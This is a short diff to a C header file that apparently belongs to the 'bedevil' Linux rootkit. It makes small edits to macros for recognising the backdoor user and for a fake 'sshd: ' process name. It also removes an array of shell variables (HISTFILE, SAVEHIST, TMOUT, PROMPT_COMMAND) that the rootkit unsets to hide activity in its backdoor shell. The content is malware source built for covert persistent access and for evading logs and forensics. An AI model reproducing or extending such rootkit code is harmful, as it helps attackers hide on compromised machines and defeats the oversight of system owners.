@@ -1,7 +1,7 @@
 #ifndef UTIL_H
 #define UTIL_H
 
-#define HOME_VAR "HOME="INSTALL_DIR
+#define HOME_VAR       "HOME="INSTALL_DIR
 #define BD_SSHPROCNAME "sshd: "BD_UNAME
 
 #define CMDLINE_PATH      "/proc/%d/cmdline"
@@ -33,7 +33,7 @@ int bd_sshproc(void);
 #endif
 #include "processes.c"
 
-#define isbduname(name) !strncmp(name, BD_UNAME, strlen(BD_UNAME))
+#define isbduname(name) !strncmp(BD_UNAME, name, strlen(BD_UNAME))
 
 /* if PAM is being used... */
 #if defined(USE_PAM_BD) || defined(LOG_LOCAL_AUTH)
@@ -74,11 +74,6 @@ int not_user(int id){
         return 1;
     return 0;
 }
-
-/* bedevil unsets the following environment variables when
- * it detects somebody (you) is in a rootkit/backdoor shell. */
-static char *unset_variables[4] = {"HISTFILE", "SAVEHIST", "TMOUT", "PROMPT_COMMAND"};
-#define UNSET_VARIABLES_SIZE sizeofarray(unset_variables)
 
 void unset_bad_vars(void);
 int is_bdusr(void);
